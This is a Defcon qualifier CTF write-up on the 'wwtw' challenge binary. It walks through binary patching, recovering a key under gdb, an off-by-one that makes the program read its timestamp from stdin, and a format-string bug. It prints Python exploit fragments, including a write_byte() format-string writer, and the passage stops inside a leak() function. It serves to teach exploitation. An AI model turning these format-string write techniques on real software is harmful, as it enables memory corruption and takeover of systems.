---
id: 2155
title: 'Defcon quals: wwtw (a series of vulns)'
date: '2015-06-09T12:29:41-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2015/2117-revision-v1'
permalink: '/?p=2155'
---

Hey folks,

This is going to be my final (and somewhat late) writeup for [the Defcon Qualification CTF](https://legitbs.net). The level was called "wibbly-wobbly-timey-wimey", or "wwtw", and was a combination of a few things (at least the way I solved it): programming, reverse engineering, logic bugs, format-string vulnerabilities, some return-oriented programming (for my solution), and Dr. Who references!

I'm not going to spend much time on the theory of format-string vulnerabilities or return-oriented programming because I just covered them in [babyecho](/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail) and [r0pbaby](https://blog.skullsecurity.org/2015/defcon-quals-r0pbaby-simple-64-bit-rop).

And by the way, I'll be building the solution in Python as we go, because the first part was solved by one of my teammates, and he's a Python guy. As much as I hated working with Python (which has become my life lately), I didn't want to re-write the first part and it was too complex to do on the shell, so I sucked it up and used his code.

You can download the binary [here](https://blogdata.skullsecurity.org/wwtw), and you can get the exploit and other files involved on [my github page](https://github.com/iagox86/defcon-quals-2015/tree/master/wwtw).

<style>.in { color: #dc322f; font-weight: bold; }</style>## Part 1: The game

The first part's a bit of a game. I wasn't all that interested in solving it, so I patched it out (see the next section) and discovered that there was another challenge I could work on while my teammate solved the game. This is going to be a very brief overview of my teammate's solution.

When you start wwtw, you will see this:

```

You(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!
   012345678901234567890
00        <
01
02  A
03
04            A
05
06                AA
07    A        A
08 A
09
10  A     A
11                  A
12                 A
13
14                    A
15    A
16 A   A              E
17
18                A
19  A
Your move (w,a,s,d,q):
```

After a few seconds, it times out. The timeout can be patched out, if you want, but the timeouts are actually somewhat important in this level as we'll see later.

You can move around your character using the w,a,s,d keys, as indicated in the little message. Your goal is to reach the tardis - represented by a 'T' - by going through the exits - represented by 'E's - and avoiding the angels - represented by 'A's. The angels will follow you when your back is turned. This stuff is, of course, a Dr. Who reference. :)

The solution to this was actually pretty straight forward: a greedy algorithm that makes the "best" move toward the exit to a square that isn't occupied by an angel works 9 times out of 10, so we stuck with that and re-ran it whenever we got stuck in a corner or along the wall.

You can see the code for it in the [exploit](https://github.com/iagox86/defcon-quals-2015/blob/master/wwtw/sploit.py). I'm not going to dwell on that part any longer.

## Part 1b: skipping the game

As I said, I didn't want to deal with solving the game, I wanted to get to the good stuff (so to speak), so I "fixed" the game such that every move would appear to be a move to the exit (it would be possible to skip the game part entirely, but this was easy and worked well enough).

This took a little bit of trial and error, but I primarily used the failure message - "Enjoy 1960..." - to figure out where in the binary to look.

If you look at all the places that string is found (in IDA, use shift-f12 or just search for it), you'll find one that looks like this:

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00002E14</span>          <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, (<span class="Identifier">aEnjoy1960____0</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>] <span class="Comment">; "Enjoy 1960..."</span>
```

If you look back a little bit, you'll find that the only way to get to that line is for this conditional jump to occur:

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00002DC0</span> <span class="Constant">83 7D F4 01 </span>                            <span class="Identifier">cmp</span>     [<span class="Identifier">ebp</span>+<span class="Identifier">var_C</span>], <span class="Constant">1</span>
<span class="Statement">.text</span>:<span class="Constant">00002DC4</span> <span class="Constant">75 48</span>                                   <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">loc_2E0E</span>
```

It's pretty easy to fix that, you can simply replace the jnz - 75 48 - with nops - 90 90. Here's a diff:

```
<pre id="vimCodeElement">
<span class="Type">--- a   2015-06-03 17:09:22.000000000 -0700</span>
<span class="Type">+++ b   2015-06-03 17:09:44.000000000 -0700</span>
<span class="Identifier">@@ -3635,7 +3635,8 @@</span>
     2db8:      e8 7f ed ff ff          call   1b3c <main+0x937>
     2dbd:      89 45 f4                mov    %eax,-0xc(%ebp)
     2dc0:      83 7d f4 01             cmpl   $0x1,-0xc(%ebp)
<span class="Special">-    2dc4:      75 48                   jne    2e0e <main+0x1c09></span>
<span class="Statement">+    2dc4:      90                      nop</span>
<span class="Statement">+    2dc5:      90                      nop</span>
     2dc6:      8d 83 e0 00 00 00       lea    0xe0(%ebx),%eax
     2dcc:      8b 00                   mov    (%eax),%eax
     2dce:      83 f8 03                cmp    $0x3,%eax
```

## Aside: Making the binary debug-able

Just as a quick aside: this program is a [PIE](https://en.wikipedia.org/wiki/Position-independent_code) - position independent executable - which means the addresses you see in IDA are all relative to 0. But when you run the program, it's assigned a "proper" address, even if ASLR is off. I don't know if there's a canonical way to deal with that, but I personally use this little trick in addition to turning off ASLR:

1. Replace the first instruction in the start() or main() function with "\\xcc" (software breakpoint) (and enough nop instructions to overwrite exactly one instruction)
2. Run it in a debugger such as gdb
3. (Optionally) use a .gdbinit file that automatically resumes execution when the breakpoint is hit

Here's the first line of start() in wwtw:

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00000A60</span> <span class="Constant">31 ED</span>                                   <span class="Identifier">xor</span>     <span class="Identifier">ebp</span>, <span class="Identifier">ebp</span>
```

Since it's a two byte instruction ("\\x31\\xED"), we open the binary in a hex editor and replace those two bytes with "\\xcc\\x90" (the "\\x90" being a nop instruction). If you try to execute it after that change, you should see this if you did it right:

```

$ <span class="in">./wwtw-blog</span>
Trace/breakpoint trap
```

And with a debugger, you can continue execution after that breakpoint:

```

$ <span class="in">gdb -q ./wwtw-blog</span>
(gdb) <span class="in">run</span>
Starting program: /home/ron/defcon-quals/wwtw/wwtw-blog

Program received signal SIGTRAP, Trace/breakpoint trap.
0x56555a61 in ?? ()
(gdb) <span class="in">cont</span>
Continuing.
You(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
[...]
```

You can also use a gdbinit file:

```

$ <span class="in">echo -e 'run\ncont' > gdbhax</span>
$ <span class="in">gdb -q -x ./gdbhax ./wwtw-blog</span>
Program received signal SIGTRAP, Trace/breakpoint trap.
0x56555a61 in ?? ()
You(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!
[...]
```

## Part 2: Starting the ignition (by debugging)

After you complete the fifth room and get to the Tardis, you're prompted for a key:

```

TARDIS KEY: <span class="in">abcd</span>
Wrong key!
Enjoy 1960...
$ <span class="in">bcd</span>
```

Funny story: I had initially nop'd out the failure condition when I was trying to nop out the "you've been eaten by an angel" code from earlier, so it actually took me awhile to even realize that this was a challenge. I had accidentally set it to - as I describe in the next section - accept any password. :)

Anyway, one thing you'll notice is that when it prompts you for the key, you can type in multiple characters, but after it kicks you out it prints all but the first character on the commandline. That's interesting, because it means that it's only consuming one character at a time and is therefore vulnerability to a bunch of attacks. If you happen to guess a correct character, it consumes one more:

```

TARDIS KEY: <span class="in">Uabcd</span>
Wrong key!
Enjoy 1960...
$ <span class="in">bcd</span>
```

(Note that it consumed both the "U" and the "a" this time)

Because it's checking one character at a time, it's pretty easy to guess it one character at a time - 62 max tries per character (31 on average) and a 10-character string means it could be guessed in something like 600 - 1000 runs. But we can do better than that!

I searched the source in IDA for the string "TARDIS KEY:" to get an idea of where to look for the code. You will find it at 0x00000ED1, which is in a fairly short function called from main(). In it, you'll see a call to both read() and getchar(). But more importantly, in the whole function, there's only one "cmp" instruction that takes two registers (as opposed to a register and an immediate value (ie, constant)):

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00000F45</span> <span class="Constant">39 C2</span>                                   <span class="Identifier">cmp</span>     <span class="Identifier">edx</span>, <span class="Identifier">eax</span>
```

If I had to take a wild guess, I'd say that this function somehow verifies the password you type in using that comparison. And if we're lucky, it'll be a comparison between what we typed and what they expected to see (it doesn't always work out that way, but when it does, it's awesome).

To set a breakpoint, we need to know which address to break at. The easiest way to do that is to [disable ASLR](https://stackoverflow.com/questions/5194666/disable-randomization-of-memory-addresses) and just have a look at what address stuff loads to. It shouldn't change if ASLR is off.

On my machine, wwtw loads to 0x56555000, which means that comparison should be at 0x56555000 + 0x00000f45 = 0x56555f45. We can verify in gdb:

```

(gdb) <span class="in">x/i 0x56555f45</span>
   0x56555f45:  cmp    edx,eax
```

We want to put a breakpoint there and print out both of those values to make sure that one is what we typed and the other isn't. I added the breakpoint to my gdbhax file because I know I'm going to be using it over and over:

```

$ <span class="in">cat gdbhax</span>
run
b *0x56555f45
cont
```

And run the process (punching in whatever you want for the five moves, since we've already "fixed" the game):

```

$ <span class="in">gdb -q -x ./gdbhax ./wwtw-blog</span>
[...]
Program received signal SIGTRAP, Trace/breakpoint trap.
0x56555a61 in ?? ()
Breakpoint 1 at 0x56555f45
You(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).
Go through the exits(E) to get to the next room and continue your search.
But, most importantly, don't blink!

[...]

TARDIS KEY: <span class="in">a</span>

Breakpoint 1, 0x56555f45 in ?? ()
(gdb)
(gdb) <span class="in">print/c $edx</span>
$2 = 65 'a'
(gdb) <span class="in">print/c $eax</span>
$3 = 85 'U'
(gdb)
```

It's comparing the first character we typed ("a") to another character ("U"). Awesome! Now we know that at that comparison, the proper character is in $eax, so we can add that to our gdbhax file:

```

$ <span class="in">cat gdbhax</span>
<span class="Statement">run</span>
b *<span class="Constant">0x56555f45</span>

cont

<span class="Statement">while</span> <span class="Constant">1</span>
  <span class="Statement">print</span>/<span class="Statement">c</span> <span class="Identifier">$eax</span>
  cont
<span class="Statement">end</span>
```

That little script basically sets a breakpoint on the comparison, then each time it breaks it prints eax and continues execution.

When you run it a second time, we start with "U" and then whatever other character so we can get the second character:

```

$ <span class="in">gdb -q -x ./gdbhax ./wwtw-blog</span>
[...]
TARDIS KEY: <span class="in">Ua</span>

Breakpoint 1, 0x56555f45 in ?? ()
$1 = 85 'U'

Breakpoint 1, 0x56555f45 in ?? ()
$2 = 101 'e'
Wrong key!
```

Then run it again with "Ue" at the start:

```

Breakpoint 1, 0x56555f45 in ?? ()
$1 = 85 'U'

Breakpoint 1, 0x56555f45 in ?? ()
$2 = 101 'e'

Breakpoint 1, 0x56555f45 in ?? ()
$3 = 83 'S'
```

...and so on. Eventually, you'll get the key "UeSlhCAGEp". If you try it, you'll see it works:

```

TARDIS KEY: <span class="in">UeSlhCAGEp</span>
Welcome to the TARDIS!
Your options are:
1. Turn on the console
2. Leave the TARDIS
```

## Part 2b: Without brute force

Usually in CTFs, if a password or key is English-looking text, it's probably hardcoded, and if it's random looking, it's generated. Since that key was obviously not English, it stands to reason that it's probably generated and therefore would not work against the real service. At this point, my teammate hadn't solved the "game" part yet, so I couldn't easily test against the real server. Instead, I decided to dig a bit deeper to see how the key was actually generated. Spoiler: it doesn't actually change, so this wound up being unnecessary. There's a reason I take a long time to solve these levels. :)

At the start of the function that references the "TARDIS KEY:" string (the function contains, but doesn't start at, address 0x00000ED1), you'll see this line:

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00000EEF</span>        <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, (<span class="Identifier">check_key</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>]
```

Later, that variable is read, one byte at a time:

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00000EFA</span> <span class="Identifier">top_loop</span>:                               <span class="Comment">; CODE XREF: check_key+A4j</span>
<span class="Statement">.text</span>:<span class="Constant">00000EFA</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, [<span class="Identifier">ebp</span>+<span class="Identifier">key_thing</span>]
<span class="Statement">.text</span>:<span class="Constant">00000EFD</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">eax</span>, <span class="Identifier">byte</span> <span class="Identifier">ptr</span> [<span class="Identifier">eax</span>]
<span class="Statement">.text</span>:<span class="Constant">00000F00</span>                 <span class="Identifier">movsx</span>   <span class="Identifier">eax</span>, <span class="Identifier">al</span>
<span class="Statement">.text</span>:<span class="Constant">00000F03</span>                 <span class="Identifier">and</span>     <span class="Identifier">eax</span>, <span class="Constant">7</span><span class="Identifier">Fh</span>
<span class="Statement">.text</span>:<span class="Constant">00000F06</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">esp</span>], <span class="Identifier">eax</span>      <span class="Comment">; int</span>
<span class="Statement">.text</span>:<span class="Constant">00000F09</span>                 <span class="Identifier">call</span>    <span class="Identifier">_isalnum</span>
```

At each point, it reads the next byte, ANDs it with 0x7F (clearing the uppermost bit), and calls isalnum() on it to see if it's a letter or a number. If it's a valid letter or number, it's considered part of the key; if not, it's skipped.

It took me far too long to see what was going on: the function I called check\_key() actually references itself and reads its own code! It reads the first dozen or so bytes from the function's binary and compares the alpha-numeric values to the key that was typed in.

To put it another way: if you look at the start of the function in a hex editor, you'll see:

```
55 89 E5 53 83 EC 24 E8 DC FB FF FF 81 C3 3C 41...
```

If we AND each of these values by 0x7F and convert them to a character, we get:

```

1.9.3-p392 :004 > <span class="in">"55 89 E5 53 83 EC 24 E8 DC FB FF FF 81 C3 3C 41".split(" ").each do |i|</span>
1.9.3-p392 :005 > <span class="in">    puts (i.to_i(16) & 0x7F).chr</span>
1.9.3-p392 :006?> <span class="in">  end</span>
U

e
S

l
$
h
\
{



C

<p>If you exclude the values that aren't alphanumeric, you can see that the first 16 bytes becomes "UeSlhCA", which is the first part of the code to start the engine!</p>
<p>Satisfied that it wasn't random, I moved on.</p>
<h2>Aside: Why did they use the function as the key?</h2>
<p>Just a quick little note in case you're wondering why the function used itself to generate the password...</p>
<p>When you set a software breakpoint (which is by far the most common type of breakpoint), behind the scenes the debugger replaces the instruction with a software breakpoint ("\xcc"). After it breaks, the real instruction is briefly replaced so the program can continue.</p>
<p>If you break on the first line of the function, then instead of the first line of the function being "\x55", which is "pop ebp", it's "\xCC" and therefore the value will be wrong. In fact, putting a breakpoint anywhere in the first ~20 bytes of that function will cause your passcode to be wrong.</p>
<p>I suspect that this was used as a subtle anti-debugging technique.</p>
<h2>Part 2c: Skipping the password check</h2>
<p>Much like the game, I didn't want to have to deal with entering the password each time around, so I found the call that checks whether or not that password was valid:</p>
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">0000125E</span>                 <span class="Identifier">test</span>    <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Constant">00001260</span>                 <span class="Identifier">jz</span>      <span class="Identifier">short</span> <span class="Identifier">loc_129C</span>
<span class="Statement">.text</span>:<span class="Constant">00001262</span>                 <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, (<span class="Identifier">aWrongKey</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>] <span class="Comment">; "Wrong key!"</span>

<p>And switched the jz ("\x74\x3a") to a jmp ("\xeb\x3a"). Once you've done that, you can type whatever you want (including nothing) for the key.</p>
<h2>Part 3: Time travelling</h2>
<p>Now that you've started the Tardis, there's another challenge: you can only turn on the console during certain times:</p>

Welcome to the TARDIS!
Your options are:
1. Turn on the console
2. Leave the TARDIS
Selection: <span class="in">1</span>
Access denied except between May 17 2015 23:59:40 GMT and May 18 2015 00:00:00 GMT

<p>Looking around in IDA, I see some odd stuff happening. For example, the program attempts to connect to localhost on a weird port and read some data from it! The function that does that is called sub_CB0() if you want to have a look. After it connects, it sets up an alarm() that calls sub_E08() every 2 seconds. In that function, it reads 4 bytes from the socket and stores them. Those 4 bytes turned out to be a timestamp.</p>
<p>Basically, it has a little timeserver running on localhost that sends it the current time. If we can make it use a different server, we can provide a custom timestamp and bypass this check. But how?</p>
<p>I played around quite a bit with this, but I didn't make any breakthroughs till I ran it in strace.</p>
<p>To run the program in strace, we no longer need the debugger, so we have to fix the first two bytes of start():</p>

<span class="Statement">.text</span>:<span class="Constant">00000A60</span> <span class="Constant">31 ED</span>                                   <span class="Identifier">xor</span>     <span class="Identifier">ebp</span>, <span class="Identifier">ebp</span>

<p>and run strace on it to see what's going on:</p>
<pre id="vimCodeElement">
<span class="Statement">socket</span><span class="Statement">(</span><span class="Identifier">PF_INET</span><span class="Normal">,</span> <span class="Identifier">SOCK_DGRAM</span><span class="Normal">,</span> <span class="Identifier">IPPROTO_IP</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">3</span>
<span class="Statement">setsockopt</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Identifier">SOL_SOCKET</span><span class="Normal">,</span> <span class="Identifier">SO_RCVTIMEO</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\0\0\0\0\350\3\0\0</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">8</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">connect</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Statement">{</span>sa_family<span class="Normal">=</span><span class="Identifier">AF_INET</span><span class="Normal">,</span> sin_port<span class="Normal">=</span>htons<span class="Statement">(</span><span class="Constant">1234</span><span class="Statement">)</span><span class="Normal">,</span> sin_addr<span class="Normal">=</span>inet_addr<span class="Statement">(</span><span class="Constant">"127.0.0.1"</span><span class="Statement">)}</span><span class="Normal">,</span> <span class="Constant">16</span><span class="Statement">)</span> <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">write</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\0</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">1</span><span class="Statement">)</span>                       <span class="Type">=</span> <span class="Type">1</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">0xffffcd88</span><span class="Normal">,</span> <span class="Constant">4</span><span class="Statement">)</span>                  <span class="Type">=</span> <span class="Type">-1</span> <span class="Identifier">ECONNREFUSED</span> <span class="Comment">(Connection refused)</span>
<span class="PreProc">[...]</span>
<span class="Normal">---</span> <span class="Identifier">SIGALRM</span> <span class="Statement">{</span>si_signo<span class="Normal">=</span><span class="Identifier">SIGALRM</span><span class="Normal">,</span> si_code<span class="Normal">=</span><span class="Identifier">SI_KERNEL</span><span class="Normal">,</span> si_value<span class="Normal">=</span><span class="Statement">{</span>int<span class="Normal">=</span><span class="Constant">111</span><span class="Normal">,</span> ptr<span class="Normal">=</span><span class="Constant">0x6f</span><span class="Statement">}}</span> <span class="Normal">---</span>
<span class="Statement">write</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\0</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">1</span><span class="Statement">)</span>                       <span class="Type">=</span> <span class="Type">1</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">3</span><span class="Normal">,</span> <span class="Constant">0xffffc6d8</span><span class="Normal">,</span> <span class="Constant">4</span><span class="Statement">)</span>                  <span class="Type">=</span> <span class="Type">-1</span> <span class="Identifier">ECONNREFUSED</span> <span class="Comment">(Connection refused)</span>
<span class="Statement">alarm</span><span class="Statement">(</span><span class="Constant">2</span><span class="Statement">)</span>                                <span class="Type">=</span> <span class="Type">0</span>
<span class="Statement">sigreturn</span><span class="Statement">()</span> <span class="Statement">(</span>mask <span class="Statement">[])</span>                   <span class="Type">=</span> <span class="Type">3</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">0</span><span class="Normal">,</span> <span class="Constant">0x5655a0b0</span><span class="Normal">,</span> <span class="Constant">9</span><span class="Statement">)</span>                  <span class="Type">=</span> <span class="Type">?</span> <span class="Identifier">ERESTARTSYS</span> <span class="Comment">(To be restarted if SA_RESTART is set)</span>
<span class="PreProc">[...]</span>

<p>Basically, it makes the connection and gets a socket numbered 3. Every 2 seconds, it reads a timestamp from the socket. One of the first things I often do while working on CTF challenges is disable alarm() calls, but in this case it was actually needed! I suspected that this is another anti-debugging measure - to catch people who disabled alarm() - and therefore I should look for the vulnerability in the callback function.</p>
<p>It turns out there wasn't really that much code, but the vulnerability was somewhat subtle and I didn't notice until I ran it in strace and typed a bunch of "A"s:</p>
<pre id="vimCodeElement">
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">0</span><span class="Normal">,</span> <span class="Identifier">AAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="Constant">"AAAAAAAAA"</span><span class="Normal">,</span> <span class="Constant">9</span><span class="Statement">)</span>                 <span class="Type">=</span> <span class="Type">9</span>
<span class="Statement">write</span><span class="Statement">(</span><span class="Constant">1</span><span class="Normal">,</span> <span class="Constant">"Invalid</span><span class="Special">\n</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">8</span>Invalid
<span class="Statement">)</span>                <span class="Type">=</span> <span class="Type">8</span>
<span class="PreProc">[...]</span>
<span class="Normal">---</span> <span class="Identifier">SIGALRM</span> <span class="Statement">{</span>si_signo<span class="Normal">=</span><span class="Identifier">SIGALRM</span><span class="Normal">,</span> si_code<span class="Normal">=</span><span class="Identifier">SI_KERNEL</span><span class="Normal">,</span> si_value<span class="Normal">=</span><span class="Statement">{</span>int<span class="Normal">=</span><span class="Constant">111</span><span class="Normal">,</span> ptr<span class="Normal">=</span><span class="Constant">0x6f</span><span class="Statement">}}</span> <span class="Normal">---</span>
<span class="Statement">write</span><span class="Statement">(</span><span class="Constant">65</span><span class="Normal">,</span> <span class="Constant">"</span><span class="Special">\0</span><span class="Constant">"</span><span class="Normal">,</span> <span class="Constant">1</span><span class="Statement">)</span>                      <span class="Type">=</span> <span class="Type">-1</span> <span class="Identifier">EBADF</span> <span class="Comment">(Bad file descriptor)</span>
<span class="Statement">read</span><span class="Statement">(</span><span class="Constant">65</span><span class="Normal">,</span> <span class="Constant">0xffffc6d8</span><span class="Normal">,</span> <span class="Constant">4</span><span class="Statement">)</span>                 <span class="Type">=</span> <span class="Type">-1</span> <span class="Identifier">EBADF</span> <span class="Comment">(Bad file descriptor)</span>
<span class="Statement">alarm</span><span class="Statement">(</span><span class="Constant">2</span><span class="Statement">)</span>                                <span class="Type">=</span> <span class="Type">0</span>
<span class="PreProc">[...]</span>

<p>When I put a bunch of "A"s into the prompt, it started reading from socket 65 (aka, 0x41 or "A") instead of from socket 3! There's an off-by-one vulnerability that allows you to change the socket identifier!</p>
<p>If you were to use "AAAAAAAA\0", it would overwrite the socket with a NUL byte, and instead of reading from socket 3 or 65, it would read from socket 0 - stdin. The very same socket we're already sending data to!</p>
<p>Here's the python code to exploit this:</p>
<pre id="vimCodeElement">
sys.stdout.write(<span class="Constant">"01234567</span><span class="Special">\0</span><span class="Constant">"</span>)
sys.stdout.flush()

time.sleep(<span class="Constant">2</span>) <span class="Comment"># Has to be at least 2</span>

sys.stdout.write(<span class="Constant">"</span><span class="Special">\x6d\x2b\x59\x55</span><span class="Constant">"</span>)
sys.stdout.flush()

<p>That hex value is a timestamp during the prescribed time. When it reads that from stdin rather than from the socket it opened, it thinks the time is right and we can then activate the TARDIS!</p>
<h2>Part 3b: Skipping the timestamp check</h2>
<p>Once again, in the interest of being able to test without waiting 2 seconds every time, we can disable the timestamp check altogether. To do that, we find the error message:</p>
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">00001409</span>  <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, (<span class="Identifier">aAccessDeniedEx</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>] <span class="Comment">; "Access denied except between %s and %s\"...</span>

<p>...and look backwards a little bit to find the jump that gets you there:</p>

<span class="Statement">.text</span>:<span class="Constant">000013BE</span> <span class="Constant">E8 45 FA FF FF</span>      <span class="Identifier">call</span>    <span class="Identifier">check_timestamp</span>
<span class="Statement">.text</span>:<span class="Constant">000013C3</span> <span class="Constant">85 C0</span>               <span class="Identifier">test</span>    <span class="Identifier">eax</span>, <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Constant">000013C5</span> <span class="Constant">74 2F</span>               <span class="Identifier">jz</span>      <span class="Identifier">short</span> <span class="Identifier">loc_13F6</span>
<span class="Statement">.text</span>:<span class="Constant">000013C7</span> <span class="Constant">8D 83 22 E1 FF FF</span>   <span class="Identifier">lea</span>     <span class="Identifier">eax</span>, (<span class="Identifier">aTheTardisConso</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>] <span class="Comment">; "The TARDIS console is online!"</span>

<p>And make sure it never happens (by replacing "\x74\x2F" with "\x90\x90"). Now we can jump directly to pressing "1" to active the TARDIS and it'll come right online:</p>

$ <span class="in">./wwtw-blog-nodebug</span>
[...]
Welcome to the TARDIS!
Your options are:
1. Turn on the console
2. Leave the TARDIS
Selection: <span class="in">1</span>
The TARDIS console is online!Your options are:
1. Turn on the console
2. Leave the TARDIS
3. Dematerialize
Selection:

<h2>Part 4: Getting the coordinates</h2>
<p>When we select option 3, we're prompted for coordinates:</p>

Your options are:
1. Turn on the console
2. Leave the TARDIS
3. Dematerialize
Selection: <span class="in">3</span>
Coordinates: <span class="in">1,2</span>
1.000000, 2.000000
You safely travel to coordinates 1,2

<p>If you look at the function that contains the "You safely travel..." string, you'll see that one of three things can happen:</p>
```

- It prints "Invalid coordinates" if you put anything other than two numbers (as defined by strtof() returning with no error, which means we can put a number then text without being "caught")
- It prints "You safely travel to coordinates \[...\]" if you put valid coordinates
- It prints "XXX is occupied by another TARDIS" if some particular set of coordinates are entered

The "XXX" in the output is actually the coordinates the user typed, as a string, passed directly to printf(). And we remember why printf(user\_string) is bad, right? (Hint: format string attacks)

The function to calculate the coordinates used a bunch of floating point math, which made me sad - I don't really know how to reverse floating point stuff, and I don't really want to learn in the middle of a level. Fortunately, I noticed that two global variables were used:

```
<pre id="vimCodeElement">
<span class="Statement">.text</span>:<span class="Constant">0000112B</span>                 <span class="Identifier">fld</span>     <span class="Identifier">ds</span>:(<span class="Identifier">dbl_3170</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>]
[...]
<span class="Statement">.text</span>:<span class="Constant">00001153</span>                 <span class="Identifier">fld</span>     <span class="Identifier">ds</span>:(<span class="Identifier">dbl_3178</span> - <span class="Constant">5000</span><span class="Identifier">h</span>)[<span class="Identifier">ebx</span>]
```

And if you look at the variables, you'll see:

```
<pre id="vimCodeElement">
<span class="Statement">.rodata</span>:<span class="Constant">00003170</span> <span class="Identifier">dbl_3170</span>        <span class="Identifier">dq</span> <span class="Constant">51</span>.<span class="Constant">492137</span>            <span class="Comment">; DATA XREF: do_jump_EXPLOITME+104r</span>
<span class="Statement">.rodata</span>:<span class="Constant">00003170</span>                                         <span class="Comment">; do_jump_EXPLOITME+11Ar</span>
<span class="Statement">.rodata</span>:<span class="Constant">0000317</span><span class="Constant">8</span> <span class="Identifier">dbl_3178</span>        <span class="Identifier">dq</span> -0.<span class="Constant">192878</span>            <span class="Comment">; DATA XREF: do_jump_EXPLOITME+12Cr</span>
<span class="Statement">.rodata</span>:<span class="Constant">0000317</span><span class="Constant">8</span>                                         <span class="Comment">; do_jump_EXPLOITME+13Er</span>
```

So that's kind of a freebie. If we enter them, it works:

```

Your options are:
1. Turn on the console
2. Leave the TARDIS
3. Dematerialize
Selection: <span class="in">3</span>
Coordinates: <span class="in">51.492137,-0.192878</span>
51.492137, -0.192878
Coordinate 51.492137,-0.192878 is occupied by another TARDIS.  Materializing there would rip a hole in time and space. Choose again.
```

And, to finish it off, let's verify that there is indeed a format-string vulnerability there:

```

Coordinates: <span class="in">51.492137,-0.192878 %x %x %x</span>
51.492137, -0.192878
Coordinate 51.492137,-0.192878 58601366 4049befe ef0f16f4 is occupied by another TARDIS.  Materializing there would rip a hole in time and space. Choose again.

Coordinates: <span class="in">51.492137,-0.192878 %n</span>
51.492137, -0.192878
Segmentation fault
```

Yup! :)

## Part 4b: Format string exploit

I'm not going to spend any time explaining what a format string vulnerability is. If you aren't familiar, check out my [last blog](/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail).

Instead, we're going to look at how I exploited this one. :)

The cool thing about this is, as you can see in the last example, if you enter "collision" coordinates (ie, the ones that trigger the format string vulnerability), the function doesn't actually return, it just prompts again. The function doesn't return until you enter valid-looking coordinates (like 1,1).

That's really handy, because it means we can exploit it over and over before letting it return. Instead of the crazy math we had to do in the earlier level, we can just write one byte at a time. And speaking of the last level, I actually solved this level *before* babyecho, so I didn't have the handy format-string generator that I wrote.

### write\_byte()

I wrote a function in python that will write a single byte to a chosen address:

```
<pre id="vimCodeElement">
<span class="Statement">def</span> <span class="Identifier">write_byte</span>(addr, value):
    s = <span class="Constant">"51.492137,-0.192878 "</span> + struct.pack(<span class="Constant">"<I"</span>, addr)
    s += <span class="Constant">"%"</span> + <span class="Identifier">str</span>(value + <span class="Constant">256</span> - <span class="Constant">24</span>) + <span class="Constant">"x%20$n</span><span class="Special">\n</span><span class="Constant">"</span>

    <span class="Identifier">print</span> s
    sys.stdout.flush()
    sys.stdin.readline()
```

Basically, it uses the classic "AAAA%NNx%MM$n" string, which we saw a whole bunch in babyecho, where:

- AAAA = the address as a 4-byte string (which will be the address written to by the %n)
- NN = the number of bytes to waste to ensure that %n writes the proper value to AAAA (keeping in mind that the coordinates and address take up 24 bytes already)
- MM = the number of elements on the stack before the format string reads itself (we can figure that out by bruteforce then hardcode it)

If that doesn't make sense, read the last blog - this is exactly the same attack (except simpler, because we only have to write a single byte).

### leak()

Meanwhile, my teammate wrote this function that, while ugly, can leak arbitrary memory addresses using "%s":

```
<pre id="vimCodeElement">
<span class="Statement">def</span> <span class="Identifier">leak</span>(address):
